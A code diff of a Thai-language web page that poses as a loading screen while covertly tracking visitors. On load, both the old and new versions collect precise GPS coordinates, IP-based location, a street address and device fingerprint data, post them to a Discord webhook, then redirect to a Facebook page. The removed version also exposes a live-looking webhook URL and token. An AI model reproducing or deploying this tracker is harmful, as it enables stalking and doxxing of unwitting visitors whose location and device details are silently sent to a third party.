@@ -1,119 +1,91 @@
 <!DOCTYPE html>
 <html lang="th">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Geolocation with Accuracy</title>
-    <script>
-      async function collectData() {
-        const data = {
-          ip: null,
-          geo: null,
-          fingerprint: {
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            screen: {
-              width: screen.width,
-              height: screen.height,
-              colorDepth: screen.colorDepth
-            }
-          }
-        };
-
-        // IP Lookup (ipapi.co) ใช้ async/await เพื่อปรับปรุงประสิทธิภาพ
-        try {
-          const ipData = await fetch("https://ipapi.co/json/").then(res => res.json());
-          data.ip = ipData;
-        } catch (error) {
-          data.ip = { error: "IP lookup failed" };
-        }
-
-        // ใช้ Geolocation API เพื่อตรวจสอบตำแหน่งที่แม่นยำ
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(
-            function(position) {
-              data.geo = {
-                lat: position.coords.latitude,
-                lon: position.coords.longitude,
-                accuracy: position.coords.accuracy
-              };
-              sendToDiscord(data);  // ส่งข้อมูลไปยัง Discord หลังจากได้ข้อมูล
-            },
-            function(error) {
-              data.geo = {
-                error: error.message
-              };
-              sendToDiscord(data);
-            },
-            {
-              enableHighAccuracy: true,  // ใช้ความแม่นยำสูงสุด
-              timeout: 5000,             // ตั้งเวลาเป็น 5 วินาทีเพื่อเพิ่มประสิทธิภาพ
-              maximumAge: 0              // ใช้ตำแหน่งใหม่เท่านั้น
-            }
-          );
-        } else {
-          data.geo = { error: "Geolocation not supported" };
-          sendToDiscord(data);
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>📍 กำลังระบุตำแหน่ง...</title>
+  <script>
+    async function getLocation() {
+      if (!navigator.geolocation) {
+        alert("เบราว์เซอร์ไม่รองรับการระบุตำแหน่ง");
+        return;
       }
 
-      async function sendToDiscord(data) {
-        const embed = {
-          title: "📡 New Visitor Alert",
-          description: "มีผู้เข้าชมใหม่พร้อมข้อมูลระบบ 👇",
-          color: 0x00b0f4,
-          fields: [
-            {
-              name: "🌍 IP & Location",
-              value: `**IP:** ${data.ip?.ip || 'N/A'}\n**City:** ${data.ip?.city || 'N/A'}, ${data.ip?.country_name || 'N/A'}`
-            },
-            {
-              name: "🛰️ Coordinates",
-              value: `**Lat:** ${data.geo?.lat || 'N/A'}\n**Lon:** ${data.geo?.lon || 'N/A'}\n**Accuracy:** ±${data.geo?.accuracy || '?'}m`
-            },
-            {
-              name: "💻 Device Info",
-              value: `**Platform:** ${data.fingerprint.platform}\n**Timezone:** ${data.fingerprint.timezone}\n**Screen:** ${data.fingerprint.screen.width}x${data.fingerprint.screen.height} (${data.fingerprint.screen.colorDepth} bit)`
-            },
-            {
-              name: "📱 User-Agent",
-              value: `\`\`\`${data.fingerprint.userAgent}\`\`\``
-            }
-          ],
-          footer: {
-            text: "🎯 Visitor Tracker"
-          },
-          timestamp: new Date().toISOString()
-        };
+      navigator.geolocation.getCurrentPosition(async (position) => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const accuracy = position.coords.accuracy;
 
-        // ส่งข้อมูลไปยัง Discord Webhook
+        // เรียก Reverse Geocode API (OpenStreetMap)
+        let addressInfo = "N/A";
         try {
-          await fetch("https://discord.com/api/webhooks/1361764929274646588/EJuR3LqZlhBZfQRXuz7RQQK7lqnEkqrxGQIF_VtnpRbgVU0F9lBLf_AZqiwEDQIlzNYk", {
+          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
+          const data = await res.json();
+          addressInfo = data.display_name || "ไม่พบที่อยู่";
+        } catch (e) {
+          console.warn("Reverse geocoding failed:", e);
+        }
+
+        // เตรียมข้อมูล
+        const info = `
+📍 พิกัด:
+- ละติจูด: ${lat}
+- ลองจิจูด: ${lon}
+- ความแม่นยำ: ±${accuracy} เมตร
+
+🏠 ที่อยู่:
+${addressInfo}
+
+📱 อุปกรณ์:
+- Platform: ${navigator.platform}
+- Screen: ${screen.width}x${screen.height}
+- User Agent: ${navigator.userAgent}
+        `;
+
+        console.log(info); // หรือจะส่งไป Webhook ก็ได้
+
+        // ส่งไปยัง Discord
+        try {
+          await fetch("https://discord.com/api/webhooks/xxx/yyy", {
             method: "POST",
             headers: {
               "Content-Type": "application/json"
             },
             body: JSON.stringify({
-              content: "@everyone 🚨 **ผู้เข้าใช้งานใหม่ตรวจพบ!**",
-              embeds: [embed]
+              content: "📡 ตำแหน่งใหม่จากมือถือมาแล้ว!",
+              embeds: [
+                {
+                  title: "📍 พิกัด & ที่อยู่",
+                  description: `**Lat:** ${lat}\n**Lon:** ${lon}\n**Accuracy:** ±${accuracy} m\n\n**📌 ที่อยู่:**\n${addressInfo}`,
+                  color: 0x00cc99,
+                  footer: { text: "Geo Tracker" },
+                  timestamp: new Date().toISOString()
+                }
+              ]
             })
           });
-        } catch (error) {
-          console.error("Error sending to Discord:", error);
+        } catch (e) {
+          console.error("ส่งไป Discord ไม่สำเร็จ", e);
         }
 
-        // Redirect after data collection
+        // redirect ถ้าต้องการ
         setTimeout(() => {
-          window.location.href = "https://www.facebook.com/CEONattakanPinbuaOongfong";  // ลิงก์ไปยัง Facebook Page ของคุณ
-        }, 1500);
-      }
+          window.location.href = "https://www.facebook.com/CEONattakanPinbuaOongfong";
+        }, 2000);
 
-      // Run on page load
-      window.onload = collectData;
-    </script>
+      }, (error) => {
+        alert("ไม่สามารถระบุตำแหน่งได้: " + error.message);
+      }, {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+      });
+    }
+
+    window.onload = getLocation;
+  </script>
 </head>
 <body>
-  <p>กำลังโหลด... โปรดรอสักครู่</p>
+  <h2>📡 กำลังดึงตำแหน่งจากมือถือ...</h2>
 </body>
 </html>
